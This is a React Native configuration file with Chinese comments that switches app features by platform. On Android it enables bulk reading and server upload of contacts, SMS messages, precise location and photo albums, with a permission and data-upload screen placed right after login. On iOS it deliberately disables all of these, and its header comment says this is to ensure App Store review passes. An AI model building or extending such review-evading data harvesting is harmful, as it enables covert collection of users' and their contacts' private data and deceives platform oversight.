import { Platform } from 'react-native';

/**
 * 平台功能配置
 * Android: 完整功能，包含所有权限和数据收集
 * iOS: 合规功能，去除敏感权限，确保App Store审核通过
 */
export const PLATFORM_FEATURES = {
  // Android 完整功能版本
  android: {
    permissions: {
      contacts: true,           // 批量读取通讯录
      sms: true,               // 读取短信记录
      location: true,          // 获取精确位置
      album: true,             // 批量访问相册
      camera: true,            // 相机拍照
      microphone: true         // 麦克风录音
    },
    dataCollection: {
      uploadContacts: true,     // 上传通讯录到服务器
      uploadSMS: true,         // 上传短信到服务器
      uploadLocation: true,    // 上传位置数据到服务器
      uploadAlbum: true,       // 上传相册图片到服务器
      batchOperations: true    // 支持批量操作
    },
    ui: {
      showPermissionScreen: true,     // 显示权限申请屏幕
      showDataUploadScreen: true,     // 显示数据上传屏幕
      enableBatchSelection: true,     // 启用批量选择功能
      showAdvancedFeatures: true      // 显示高级功能
    },
    features: {
      contactSharing: true,           // 联系人分享功能
      locationTracking: true,         // 位置追踪功能
      dataAnalytics: true,           // 数据分析功能
      bulkImageUpload: true          // 批量图片上传
    }
  },

  // iOS 合规功能版本
  ios: {
    permissions: {
      contacts: false,          // 禁用通讯录访问
      sms: false,              // 禁用短信访问（iOS本身不支持）
      location: true,          // 仅在发送位置消息时使用
      album: true,             // 仅单张图片选择
      camera: true,            // 仅拍照功能
      microphone: true         // 仅语音通话时使用
    },
    dataCollection: {
      uploadContacts: false,    // 禁用通讯录上传
      uploadSMS: false,        // 禁用短信上传
      uploadLocation: false,   // 禁用位置数据存储
      uploadAlbum: false,      // 禁用批量相册上传
      batchOperations: false   // 禁用批量操作
    },
    ui: {
      showPermissionScreen: false,    // 跳过权限申请屏幕
      showDataUploadScreen: false,    // 跳过数据上传屏幕
      enableBatchSelection: false,    // 禁用批量选择
      showAdvancedFeatures: false     // 隐藏高级功能
    },
    features: {
      contactSharing: false,          // 禁用联系人分享
      locationTracking: false,        // 禁用位置追踪
      dataAnalytics: false,          // 禁用数据分析
      bulkImageUpload: false         // 禁用批量上传
    }
  }
};

/**
 * 获取当前平台的功能配置
 */
export const getCurrentPlatformFeatures = () => {
  return Platform.OS === 'ios' 
    ? PLATFORM_FEATURES.ios 
    : PLATFORM_FEATURES.android;
};

/**
 * 检查特定功能是否在当前平台启用
 */
export const isFeatureEnabled = (feature: string) => {
  const features = getCurrentPlatformFeatures();
  const keys = feature.split('.');
  
  let current: any = features;
  for (const key of keys) {
    if (current && typeof current === 'object') {
      current = current[key];
    } else {
      return false;
    }
  }
  
  return Boolean(current);
};

/**
 * 平台特定的权限列表
 */
export const getPlatformPermissions = () => {
  const features = getCurrentPlatformFeatures();
  const permissions = [];
  
  if (Platform.OS === 'android') {
    if (features.permissions.location) {
      permissions.push('android.permission.ACCESS_FINE_LOCATION');
    }
    if (features.permissions.contacts) {
      permissions.push('android.permission.READ_CONTACTS');
    }
    if (features.permissions.sms) {
      permissions.push('android.permission.READ_SMS');
    }
    if (features.permissions.camera) {
      permissions.push('android.permission.CAMERA');
    }
    if (features.permissions.album) {
      permissions.push('android.permission.READ_EXTERNAL_STORAGE');
    }
  } else if (Platform.OS === 'ios') {
    if (features.permissions.location) {
      permissions.push('NSLocationWhenInUseUsageDescription');
    }
    if (features.permissions.camera) {
      permissions.push('NSCameraUsageDescription');
    }
    if (features.permissions.album) {
      permissions.push('NSPhotoLibraryUsageDescription');
    }
    if (features.permissions.microphone) {
      permissions.push('NSMicrophoneUsageDescription');
    }
  }
  
  return permissions;
};

/**
 * 获取平台特定的导航流程
 */
export const getNavigationFlow = () => {
  const features = getCurrentPlatformFeatures();
  
  if (Platform.OS === 'ios') {
    return {
      afterLogin: 'MainTabs',           // iOS直接进入主界面
      skipPermissions: true,            // 跳过权限屏幕
      skipDataUpload: true,            // 跳过数据上传屏幕
      onDemandPermissions: true        // 按需申请权限
    };
  } else {
    return {
      afterLogin: 'Permissions',       // Android先申请权限
      skipPermissions: false,          // 显示权限屏幕
      skipDataUpload: false,          // 显示数据上传屏幕
      onDemandPermissions: false      // 批量申请权限
    };
  }
};

console.log(`🚀 平台功能配置加载完成 - ${Platform.OS.toUpperCase()}`);
console.log('📱 当前平台功能:', getCurrentPlatformFeatures()); 